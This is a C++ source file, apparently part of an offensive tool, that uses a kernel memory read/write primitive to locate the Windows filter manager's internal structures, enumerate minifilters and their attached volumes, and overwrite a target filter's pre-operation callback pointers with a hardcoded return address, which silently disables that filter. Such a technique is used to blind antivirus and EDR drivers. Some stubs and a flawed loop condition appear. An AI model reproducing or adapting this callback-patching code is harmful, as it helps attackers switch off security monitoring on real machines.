#include "FltUtil.h"

PFLT_FILTER GetFilterByName(const wchar_t* strFilterName)
{
	return PFLT_FILTER();
}

BOOL GetFilterOperationByMajorFn(PFLT_FILTER lpFilter, DWORD MajorFunction)
{
	return 0;
}

DWORD GetFrameCount()
{
	return 0;
}


PVOID FltManager::ResolveFltmgrBase()
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(L"fltmgr.sys", buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
{
	HMODULE hFltmgr = LoadLibraryExA(R"(C:\WINDOWS\System32\drivers\FLTMGR.SYS)", NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
	if (!hFltmgr) {
		return NULL;
	}

	LPVOID lpFltMgrBase = (PVOID)((SIZE_T)hFltmgr & 0xFFFFFFFFFFFFFF00);
	INT32 dwOffset = 0;
	PUCHAR lpData = 0;
	BOOL bFound = FALSE;

	UCHAR ucharLoadFltGlobals[3] = {
		0x48, 0x8d, 0x0d, // lea rcx, cs:FltGlobals+0x58
	};

	_peb_ldr ldr = _peb_ldr(lpFltMgrBase);

	PBYTE lpFltEnumerateFilters = (PBYTE)ldr.get(cexpr_adler32("FltEnumerateFilters"));
	if (!lpFltEnumerateFilters) {
		return NULL;
	}

	for (SIZE_T i = 0; i < 0x200; i++) {
		for (SIZE_T j = 0; j < 0x200 + j; j++) {
			if (lpFltEnumerateFilters[j + i] != ucharLoadFltGlobals[j]) {
				break;
			}
			else if (j + 1 == sizeof(ucharLoadFltGlobals)) {
				bFound = TRUE;
				lpData = lpFltEnumerateFilters + i;
			}
		}
	}

	SIZE_T diff = (SIZE_T)lpData - (SIZE_T)lpFltMgrBase;
	LPVOID lpkFltEnumerateFilters = (PVOID)((SIZE_T)lpkFltMgrBase + diff);
	dwOffset = *(INT32*)(lpData + 3);
	return (PVOID)((SIZE_T)lpkFltEnumerateFilters + 7 + dwOffset - 0x58);
}

FltManager::FltManager(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpFltMgrBase = ResolveFltmgrBase();
	this->lpFltGlobals = ResolveFltmgrGlobals(this->lpFltMgrBase);
	bool b = this->objMemHandler->VirtualRead(
		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_COUNT),
		&this->ulNumFrames,
		sizeof(ULONG)
	);
	if (!b) {
		puts("Could not read frame count");
		return;
	}

	b = this->objMemHandler->VirtualRead(
		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_LIST),
		&this->lpFltFrameList,
		sizeof(PVOID)
	);
	if (!b) {
		puts("Could not read frame list");
		return;
	}
}

PVOID FltManager::GetFilterByName(const wchar_t* strFilterName)
{
	PVOID lpListHead = NULL;
	PVOID lpFlink = NULL;
	DWORD64 lpFltFrame = NULL;
	ULONG ulFiltersInFrame = 0;

	DWORD64 qwFrameListIter = 0;
	DWORD64 qwFrameListHead = 0;
	DWORD64 lpFilter = 0;

	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpFltFrameList,
		&lpListHead,
		sizeof(PVOID)
	);
	if (!b) {
		puts("Failed to read frame list head!");
		return NULL;
	}

	printf("List of filters at - %p\n", lpListHead);

	// for each frame
	for (ULONG i = 0; i < this->ulNumFrames; i++) {
		printf("===== FRAME %d =====\n", i);
		// read the flink
		b = this->objMemHandler->VirtualRead(
			(DWORD64)lpListHead,
			&lpFlink,
			sizeof(PVOID)
		);
		if (!b) {
			puts("Failed to read frame list flink!");
			return NULL;
		}
		// now that we've read the FLINK, subtract 0x8 to give us the adjusted _FLTP_FRAME*
		lpFltFrame = (DWORD64)lpFlink - 0x8;
		// now we need to read the number of filters associated with this frame

		printf(
			"Reading count of filters from %llx\n", 
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT
		);

		b = this->objMemHandler->VirtualRead(
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT,
			&ulFiltersInFrame,
			sizeof(ULONG)
		);
		if (!b) {
			puts("Failed to read filter count for frame!");
			return NULL;
		}
		printf("Found %d filters for frame\n", ulFiltersInFrame);
		
		b = this->objMemHandler->VirtualRead(
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_FILTER_LISTHEAD,
			&qwFrameListHead,
			sizeof(DWORD64)
		);

		if (!b) {
			puts("Failed to read frame list head!");
			return NULL;
		}

		
		qwFrameListIter = qwFrameListHead;

		for (ULONG j = 0; j < ulFiltersInFrame; j++) {
			DWORD64 qwFilterName = 0;
			DWORD64 qwFilterNameBuffPtr = 0;
			USHORT Length = 0;
			
			// adjust by subtracting 0x10 to give us a pointer to our filter
			lpFilter = qwFrameListIter - 0x10;
			qwFilterName = lpFilter + FILTER_OFFSET_NAME;

			// now we read the length of the name
			b = this->objMemHandler->VirtualRead(
				qwFilterName + UNISTR_OFFSET_LEN,
				&Length,
				sizeof(USHORT)
			);
			
			if (!b) {
				puts("Failed to read size of string for filter name!");
				return NULL;
			}
			// find the pointer to the name buffer
			b = this->objMemHandler->VirtualRead(
				qwFilterName + UNISTR_OFFSET_BUF,
				&qwFilterNameBuffPtr,
				sizeof(DWORD64)
			);
			if (!b) {
				puts("Failed to read buffer pointer for filter name!");
				return NULL;
			}

			// allocate a buffer for the name
			wchar_t* buf = new wchar_t[((SIZE_T)Length)+2];
			memset(buf, 0, ((SIZE_T)Length) + 2);

			// now read in the actual name
			b = this->objMemHandler->VirtualRead(
				qwFilterNameBuffPtr,
				buf,
				Length
			);
			if (!b) {
				puts("Failed to read buffer pointer for filter name!");
				delete[] buf;
				return NULL;
			}
			printf("\t\nFilter %d - %S", j, buf);
			// compare it to our desired filter

			if (!lstrcmpiW(buf, strFilterName)) {
				printf("\nFound target filter at %llx\n", lpFilter);
				return (PVOID)lpFilter;
			}

			// read in the next flink
			b = this->objMemHandler->VirtualRead(
				qwFrameListIter,
				&qwFrameListIter,
				sizeof(DWORD64)
			);


			if (!b) {
				puts("Failed to read next flink!");
				delete[] buf;
				return NULL;
			}
			

			// free the buffer 
			delete[] buf;
		}
		// read the list of registered filters in the frame

	}
	printf("\nFailed to find filter matching name %S\n", strFilterName);
	return NULL;
}

PVOID FltManager::GetFrameForFilter(LPVOID lpFilter)
{
	PVOID lpFrame = NULL;

	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFilter + 0x30,
		&lpFrame,
		sizeof(PVOID)
	);

	return lpFrame;
}

std::vector<FLT_OPERATION_REGISTRATION> FltManager::GetOperationsForFilter(PVOID lpFilter)
{
	std::vector<FLT_OPERATION_REGISTRATION> retVec = std::vector<FLT_OPERATION_REGISTRATION>();
	if (!lpFilter) {
		puts("lpFilter is NULL!");
		return retVec;
	}

	DWORD64 qwOperationRegIter = 0;
	DWORD64 qwOperationRegPtr = 0;

	// first we read the pointer to the table of FLT_OPERATION_REGISTRATION
	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFilter + FILTER_OFFSET_OPERATIONS,
		&qwOperationRegPtr, 
		sizeof(DWORD64)
	);

	printf("Operations at %llx\n", qwOperationRegPtr);
	while (TRUE) {
		FLT_OPERATION_REGISTRATION* fltIter = new FLT_OPERATION_REGISTRATION();
		b = this->objMemHandler->VirtualRead(
			qwOperationRegPtr,
			fltIter,
			sizeof(FLT_OPERATION_REGISTRATION)
		);
		
		// read until we get IRP_MJ_OPERATION_END
		if (fltIter->MajorFunction == IRP_MJ_OPERATION_END) {
			break;
		}
		retVec.push_back(*fltIter);
		qwOperationRegPtr += sizeof(FLT_OPERATION_REGISTRATION);

	}

	return retVec;
}

PVOID FltManager::FindRet1()
{
	return PVOID();
}

std::unordered_map<wchar_t*, PVOID> FltManager::EnumFrameVolumes(LPVOID lpFrame)
{
	ULONG ulNumVolumes = 0;
	DWORD64 qwListIter = 0;

	std::unordered_map<wchar_t*, PVOID> retVal;

	// first we read the count of volumes
	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFrame + FRAME_OFFSET_VOLUME_LIST + VOLUME_LIST_OFFSET_COUNT,
		&ulNumVolumes,
		sizeof(ULONG)
	);

	printf("Found %d attached volumes for frame %p\n", ulNumVolumes, lpFrame);

	// read the list head
	b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFrame + FRAME_OFFSET_VOLUME_LIST + VOLUME_LIST_OFFSET_LIST,
		&qwListIter,
		sizeof(DWORD64)
	);

	for (ULONG i = 0; i < ulNumVolumes; i++) {
		DWORD64 lpVolume = qwListIter - 0x10;
		DWORD64 lpBuffer = lpVolume + VOLUME_OFFSET_DEVICE_NAME + UNISTR_OFFSET_BUF;
		DWORD64 lpBufferLen = lpVolume + VOLUME_OFFSET_DEVICE_NAME + UNISTR_OFFSET_LEN;
		DWORD64 lpBufferPtr = 0;
		ULONG ulDeviceNameLen = 0;

		// read the string length first
		b = this->objMemHandler->VirtualRead(
			lpBufferLen,
			&ulDeviceNameLen,
			sizeof(USHORT)
		);

		// read the pointer to the buffer
		b = this->objMemHandler->VirtualRead(
			lpBuffer,
			&lpBufferPtr,
			sizeof(DWORD64)
		);


		// then read the actual buffer
		wchar_t* buf = new wchar_t[(SIZE_T)ulDeviceNameLen + 2];
		memset(buf, 0, (SIZE_T)ulDeviceNameLen + 2);

		b = this->objMemHandler->VirtualRead(
			lpBufferPtr,
			buf,
			ulDeviceNameLen
		);

		retVal[buf] = (PVOID)lpVolume;

		printf("%d\t%S\n", i, buf);

		// go to the next link
		b = this->objMemHandler->VirtualRead(
			(DWORD64)qwListIter,
			&qwListIter,
			sizeof(DWORD64)
		);
	}
	return retVal;
}

DWORD FltManager::GetFrameCount()
{
	return this->ulNumFrames;
}

BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations, std::unordered_map<wchar_t*, PVOID> mapTargetVolumes)
{
	for (const FLT_OPERATION_REGISTRATION &op : vecTargetOperations) {
		// FltpSetCallbacksForInstance
		/*
			while ( lpFilterOperations->MajorFunction != 0x80 && dwNumCallbackNodes )
			{
				if ( (unsigned __int8)(lpFilterOperations->MajorFunction + 20) > 1u
					&& (lpFilterOperations->PreOperation || lpFilterOperations->PostOperation) )
				{
					v10 = lpFilterOperations->MajorFunction + 22;// index into the callback node array
					if ( v10 < 0x32u )
					{
					if ( *(_QWORD *)(lpPoolWithTag + 8i64 * v10 + 160) )
					{
						ExReleaseCacheAwarePushLockSharedEx(v9, 0i64);
						KeLeaveGuardedRegion();
						return 3223060493i64;
					}
					FltpInitializeCallbackNode(
						(unsigned int)lpPoolWithTagOffset0x230,
						(_FLT_OPERATION_REGISTRATION *)(_DWORD)lpFilterOperations,
						0i64,
						0i64,
						0i64,
						0i64,
						lpPoolWithTag,
						v10);
					lpPoolWithTagOffset0x230 += 48i64;      // called for demominifilter
															// 
					--dwNumCallbackNodes;
					}
				}
				++lpFilterOperations;
			}
		*/
		UCHAR index = (UCHAR)op.MajorFunction + 22;

		// read the pointer to the volume's callback table
		for (auto& vol : mapTargetVolumes) {
			if (index > 50) {
				printf("Skipping non-indexed adjusted major fn - %d", index);
				continue;
			}

			DWORD64 lpTargetCallbackListEntryPtr = (DWORD64)vol.second + VOLUME_OFFSET_CALLBACK_TBL + (index * 0x10);
			printf("==== MajFn - %d ListEntryPtr - %llx ====\n", index, lpTargetCallbackListEntryPtr);
			DWORD64 lpListHead = 0;
			DWORD64 lpListIter = 0;

			bool b = this->objMemHandler->VirtualRead(
				lpTargetCallbackListEntryPtr,
				&lpListHead,
				sizeof(DWORD64)
			);

			lpListIter = lpListHead;
			do {
				// read in the preop
				DWORD64 lpPreOp = 0;
				bool b = this->objMemHandler->VirtualRead(
					lpListIter + CALLBACK_NODE_OFFSET_PREOP,
					&lpPreOp,
					sizeof(DWORD64)
				);

				if (lpPreOp == (DWORD64)op.PreOperation) {
					DWORD64 lpRet1 = 0xfffff8042f3caab8;
					printf("\tVol %S\n\tPreOp %llx\n\tCallbackNodePtr %llx\n", vol.first, op.PreOperation, lpListIter + CALLBACK_NODE_OFFSET_PREOP);
					b = this->objMemHandler->VirtualWrite(
						lpListIter + CALLBACK_NODE_OFFSET_PREOP,
						&lpRet1,
						sizeof(DWORD64)
					);
					puts("\t++ Patched callback! ++");
				}

				// read the next FLINK
				b = this->objMemHandler->VirtualRead(
					lpListIter,
					&lpListIter,
					sizeof(DWORD64)
				);
			} while (lpListIter != lpListHead);

		}
	}
	return 0;
}

FltManager::~FltManager()
{
}
